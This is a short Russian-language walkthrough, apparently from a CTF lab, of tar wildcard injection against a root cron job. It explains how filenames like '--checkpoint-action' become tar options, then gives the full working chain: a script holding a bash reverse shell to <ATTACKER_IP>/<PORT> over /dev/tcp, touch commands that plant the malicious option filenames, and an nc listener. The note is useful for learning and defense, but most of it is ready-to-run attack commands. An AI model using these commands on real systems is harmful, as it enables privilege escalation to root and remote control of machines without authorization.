# Проблема заключается в том, как Unix-оболочка обрабатывает символ подстановки *. Когда пользователь (например, root) выполняет команду tar cf *, оболочка раскрывает * в список всех файлов в текущей директории. Если злоумышленник может создавать файлы в этой директории, он может создать файлы с именами, которые выглядят как опции команды tar (начинающиеся с --). В результате команда, выполняемая от имени привилегированного пользователя, может быть изменена.

# В частности, tar имеет опции --checkpoint и --checkpoint-action, которые позволяют выполнить произвольную команду при создании архива.

# Пример эксплуатации (на примере root-крона)
cd /var/www/html && tar cf /home/milesdyson/backups/backup.tgz *

# Создать вредоносный скрипт в директории /var/www/html(может не сработать, используем другой скрипт):

cd /var/www/html
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> shell.sh
chmod +x shell.sh

# Создать файлы-«опции», которые tar воспримет как команды:

touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# Запустить слушатель на атакующей машине и ждать выполнения крона:
nc -lvnp <PORT>